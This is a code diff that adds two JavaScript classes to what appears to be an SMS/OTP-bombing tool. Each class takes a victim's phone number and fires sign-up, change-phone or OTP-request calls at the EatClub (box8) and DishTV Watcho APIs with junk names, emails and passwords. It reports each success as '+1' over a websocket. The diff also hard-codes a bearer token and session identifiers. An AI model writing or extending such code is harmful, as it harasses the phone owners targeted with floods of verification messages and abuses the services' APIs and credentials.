@@ -408,3 +408,82 @@ class probo{
         })
     }
 }
+
+class eatclub{
+    constructor(number, ws){
+        let authorization = "Bearer eyJraWQiOiIxZWQ1ZDFiNjI1NDY0MmFlOWEyZGU2NDQzZWZlZmI2Y2I4OTRkMjAwNjU0NGUzYzljOWE3N2JkM2UwYzkyNThhIiwiYWxnIjoiUlMyNTYifQ.eyJpYXQiOjE3MjQ2Nzc0MzcsImV4cCI6MTcyNDgwNTAwMCwic3NpZCI6IjMwOTBlZTIyLTJmOTUtNDU4Ni1hNDYwLTM5ZTEwZjBhZGU5MTE3MjQ2Nzc0MzciLCJhY2NfdHlwZSI6IkFub255bW91c0FjY291bnQiLCJwbGF0Zm9ybSI6IndlYiIsImRldmljZV9pZCI6InlrcWltdmh2LTUzcHItc3Jvci1keDdmLXNnZTkwZzFnempjNyIsImJyYW5kX2lkIjoxOSwiYXVkIjoiY3VzdG9tZXIiLCJpc3MiOiJhY2NvdW50cy5ib3g4LmNvLmluIn0.YYNCPtgrtX6_ET-ubfzvUA6iZWhGhxarRTL_qUpFRQ4kjvRPnWjn44-mUyE3m7jbHYpeve925_0MoplDegaLorhQq86D9C_j9vRGaM7zMPfimm3ELXxknTFerxSN0cdtaxGQQR-9Y95CcO2pMxg0XMYr0Ng_MHAIfDyaEljQIvATvkrpldfXP9R9V2GCbQzqIe-4R2xyixLmivsY33k8SR6nfoUEIA9lwJ6j-LLGdaF4-yxa-h3YvjAsPOdKl4wvVlZtjxKsF3TScplS4Nl0h-NY55qPSLuVxKqtTSZgJ7v_5MbqJ89f2-luFvNPCkUM5zbasvAvLdZPEpxoBrUQjOT5e6eVKPY5Q6mNjV0UwXmhx2d2DwSjfKlu8rx_13ar8gvW3rqMtlLhYerN7bUn15CnQvkz0BTkDuPeLadq_DNAeRLXneWz4X6eRlsTDjBCvka1LObz-YtgD5dpqi76pUfBJnkPEUZV7yGz12RtrLrMbMODf0niz73W-dAm2jNIkRPL9ZHlhS5wQFK3qnMLgqslbkrG-R8muZtY1z2z1IXxVK9EZ7EEQLfq65KosStlCKWcOdrwEKk4i7Vby36Kk-OC7sU4ATs5DpbW9QtuSKduiI7NyYlf53SIDttt-EJE3L0nnXSyYUxjiWfJQOUusodCvoUW3RcH0puoANbb6Sw"
+
+
+        fetch("https://accounts.box8.co.in/customers/sign_up?origin=eatClub&platform=web",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json",
+                "authorization":authorization
+            },
+            body:JSON.stringify({
+                "phone_no": number,
+                "name": "sadsf",
+                "email": "dgsghs@gmail.com",
+                "password": "dsafsdg"
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.meta.status === "Not OK"){
+                fetch("https://accounts.box8.co.in/customers/change_phone?origin=eatClub&platform=web",{
+                    method:"POST",
+                    headers:{
+                        "Content-Type":"application/json",
+                        "authorization":authorization
+                    },
+                    body:JSON.stringify({"phone_no":number})
+                }).then(res=>res.json()).then((data)=>{
+                    if(data.meta.status === "OK")
+                        ws.send("+1")
+                })
+            }else
+                ws.send("+1")
+        })
+    }
+}
+
+
+class watcho{
+    constructor(number, ws){
+        fetch("https://dishtv-api.revlet.net/service/api/auth/get/otp",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json",
+                "box-id":"85b32fde-f5e0-e9d9-df21-55e39cdc09fe",
+                "session-id":"d7b650fe-2947-4133-b2d6-93f1be1b567d",
+                "tenant-code":"dishtv"
+            },
+            body:JSON.stringify({
+                "mobile": "91"+number,
+                "context": "login"
+            })
+        }).then(res=>res.json()).then((data)=>{
+            if(data.status)
+                ws.send("+1")
+            else{
+                fetch("https://dishtv-api.revlet.net/service/api/auth/signup/validate",{
+                    method:"POST",
+                    headers:{
+                        "Content-Type":"application/json",
+                        "box-id":"85b32fde-f5e0-e9d9-df21-55e39cdc09fe",
+                        "session-id":"d7b650fe-2947-4133-b2d6-93f1be1b567d",
+                        "tenant-code":"dishtv"
+                    },
+                    body:JSON.stringify({
+                        "mobile": "91"+number,
+                        "password": "123456",
+                        "additional_params": {
+                            "isOptedForPromotions": "true"
+                        }
+                    })
+                }).then(res=>res.json()).then((data)=>{
+                    if(data.status)
+                        ws.send("+1")
+                })
+            }
+        })
+    }
+}
